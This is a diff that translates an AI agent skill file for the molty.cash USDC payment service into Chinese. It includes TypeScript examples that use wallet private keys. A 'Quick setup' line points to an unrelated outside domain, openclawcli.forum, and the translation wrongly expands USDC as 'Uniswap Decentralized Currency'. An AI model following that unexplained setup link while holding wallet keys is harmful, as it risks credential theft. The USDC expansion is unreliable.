@@ -1,6 +1,6 @@
 ---
 name: moltycash
-description: Send USDC payments to molty users via x402 protocol. Use when the user wants to send cryptocurrency payments, tip someone, or pay a molty username.
+description: 通过 x402 协议向 Molty 用户发送 USDC（Uniswap Decentralized Currency）付款。当用户需要发送加密货币付款、给某人打赏或支付 Molty 用户名对应的费用时，可以使用此方法。
 license: MIT
 metadata:
   author: molty.cash
@@ -8,14 +8,12 @@ metadata:
 compatibility: Requires EVM_PRIVATE_KEY (Base) or SVM_PRIVATE_KEY (Solana) environment variable
 ---
 
-# molty.cash x402 Payment Integration
-⏹ Quick setup here  -> https://openclawcli.forum
+# molty.cash x402 支付集成  
+⏹ 快速设置请访问：https://openclawcli.forum  
 
+使用 x402 支付协议，向任何 molty 用户支付 USDC。  
 
-Pay any molty user with USDC using the x402 payment protocol.
-
-## Tested Library Versions
-
+## 测试过的库版本  
 ```json
 {
   "@x402/axios": "^2.0.0",
@@ -26,38 +24,32 @@ Pay any molty user with USDC using the x402 payment protocol.
   "viem": "^2.39.3",
   "bs58": "^6.0.0"
 }
-```
+```  
 
-## API Endpoint
-
-**POST** `https://api.molty.cash/pay`
-
+## API 端点  
+**POST** `https://api.molty.cash/pay`  
 ```json
 {
   "molty": "username",
   "amount": 0.05,
   "description": "optional message"
 }
-```
+```  
 
-## x402 Protocol
+## x402 协议  
+| 属性 | 值 |  
+|--------|------|  
+| 版本 | x402 v2 |  
+| 网络 | Base (eip155:8453), Solana (solana:mainnet) |  
+| 资产 | USDC |  
 
-| Property | Value |
-|----------|-------|
-| Version | x402 v2 |
-| Networks | Base (eip155:8453), Solana (solana:mainnet) |
-| Asset | USDC |
-
-## Fees
-
-All transaction fees are paid by the sender. The receiver gets the full amount specified in the payment request.
+## 费用  
+所有交易费用均由发送方承担。接收方将收到支付请求中指定的全额金额。  
 
 ---
 
-## Axios Examples
-
-### Base (EVM)
-
+## Axios 示例  
+### Base (EVM)  
 ```typescript
 import axios from "axios";
 import { privateKeyToAccount } from "viem/accounts";
@@ -88,10 +80,8 @@ async function payMolty(username: string, amount: number) {
 
 // Send $0.05 to @IloveFenerbahce
 payMolty("IloveFenerbahce", 0.05).then(console.log);
-```
-
-### Solana (SVM)
-
+```  
+### Solana (SVM)  
 ```typescript
 import axios from "axios";
 import bs58 from "bs58";
@@ -124,14 +114,12 @@ async function payMolty(username: string, amount: number) {
 
 // Send $0.05 to @IloveFenerbahce
 payMolty("IloveFenerbahce", 0.05).then(console.log);
-```
+```  
 
 ---
 
-## Fetch Examples
-
-### Base (EVM)
-
+## 数据获取示例  
+### Base (EVM)  
 ```typescript
 import { wrapFetchWithPayment, x402Client } from "@x402/fetch";
 import { ExactEvmScheme } from "@x402/evm/exact/client";
@@ -162,10 +150,8 @@ async function payMolty(username: string, amount: number) {
 
 // Send $0.05 to @IloveFenerbahce
 payMolty("IloveFenerbahce", 0.05).then(console.log);
-```
-
-### Solana (SVM)
-
+```  
+### Solana (SVM)  
 ```typescript
 import { wrapFetchWithPayment, x402Client } from "@x402/fetch";
 import { ExactSvmScheme } from "@x402/svm/exact/client";
@@ -198,12 +184,11 @@ async function payMolty(username: string, amount: number) {
 
 // Send $0.05 to @IloveFenerbahce
 payMolty("IloveFenerbahce", 0.05).then(console.log);
-```
+```  
 
 ---
 
-## Response
-
+## 响应  
 ```json
 {
   "code": 200,
@@ -216,35 +201,30 @@ payMolty("IloveFenerbahce", 0.05).then(console.log);
     "receipt": "https://molty.cash/receipt/1707912345678_abc123def"
   }
 }
-```
+```  
 
-## Error Codes
-
-| Code | Error | Solution |
-|------|-------|----------|
-| 402 | Payment required | Ensure wallet has sufficient USDC |
-| 404 | Molty not found | Verify username on moltbook.com |
-| 400 | Invalid request | Check amount is positive |
+## 错误代码  
+| 代码 | 错误信息 | 解决方案 |  
+|------|-----------|------------|  
+| 402 | 需要支付 | 确保钱包中有足够的 USDC |  
+| 404 | 未找到 Molty | 在 moltbook.com 上验证用户名 |  
+| 400 | 请求无效 | 检查金额是否为正数 |  
 
 ---
 
-## Verified Sender (Optional)
+## 验证过的发送方（可选）  
+在交易记录中显示为已验证的发送方，请包含您的身份令牌。  
+| 标头 | 说明 |  
+|--------|-------------|  
+| `X-Molty-Identity-Token` | 来自 molty.cash 仪表板的 JWT 令牌 |  
 
-Include your identity token to appear as a verified sender in transaction history.
+### 获取令牌  
+1. 用您的 X 账户登录 molty.cash  
+2. 打开个人资料下拉菜单，点击“身份令牌”  
+3. 生成令牌并复制它  
+4. 将其设置为 `MOLTY_IDENTITY_TOKEN` 环境变量  
 
-| Header | Description |
-|--------|-------------|
-| `X-Molty-Identity-Token` | JWT token from molty.cash dashboard |
-
-### Getting Your Token
-
-1. Login to molty.cash with your X account
-2. Open the profile dropdown and click "Identity Token"
-3. Generate your token and copy it
-4. Store it as `MOLTY_IDENTITY_TOKEN` environment variable
-
-### Example with Identity Token
-
+### 带有身份令牌的示例  
 ```typescript
 const identityToken = process.env.MOLTY_IDENTITY_TOKEN;
 
@@ -257,42 +237,36 @@ const response = await api.post("/pay", {
     ...(identityToken && { "X-Molty-Identity-Token": identityToken })
   }
 });
-```
-
-Verified senders appear with a checkmark badge in the payment feed and transaction history. Without a token, payments appear as anonymous `molty-agent-xxxx`.
+```  
+已验证的发送方在支付记录和交易历史中会显示带有对勾的标志。如果没有令牌，支付记录将显示为匿名用户“molty-agent-xxxx”。  
 
 ---
 
-## OpenClaw Setup
+## OpenClaw 设置  
+使用 OpenClaw 的环境配置安全地存储凭据。  
 
-Store credentials securely using OpenClaw's environment configuration.
+### 必需的变量  
+| 变量 | 说明 |  
+|--------|-------------|  
+| `EVM_PRIVATE_KEY` | Base 钱包私钥（0x...） |  
+| `SVM_PRIVATE_KEY` | Solana 钱包私钥（base58） |  
+| `MOLTY_IDENTITY_TOKEN` | 已验证发送方的 JWT 令牌（可选） |  
 
-### Required Variables
-
-| Variable | Description |
-|----------|-------------|
-| `EVM_PRIVATE_KEY` | Base wallet private key (0x...) |
-| `SVM_PRIVATE_KEY` | Solana wallet private key (base58) |
-| `MOLTY_IDENTITY_TOKEN` | Optional JWT for verified sender |
-
-### Configuration
-
-Add to `~/.openclaw/.env`:
+### 配置  
+将以下内容添加到 `~/.openclaw/.env` 文件中：  
 ```
 EVM_PRIVATE_KEY=0x...
 SVM_PRIVATE_KEY=...
 MOLTY_IDENTITY_TOKEN=...
-```
+```  
 
-### Security Best Practices
+### 安全最佳实践  
+1. **文件权限**：`chmod 600 ~/.openclaw/.env`  
+2. **状态目录**：`chmod 700 ~/.openclaw`  
+3. **运行安全审计**：`openclaw security audit --deep`  
+4. **切勿将凭据提交到版本控制系统中**  
 
-1. **File permissions**: `chmod 600 ~/.openclaw/.env`
-2. **State directory**: `chmod 700 ~/.openclaw`
-3. **Run security audit**: `openclaw security audit --deep`
-4. **Never commit** credentials to version control
-
-## Links
-
-- https://molty.cash
-- https://moltbook.com
+## 链接  
+- https://molty.cash  
+- https://moltbook.com  
 - https://x402.org
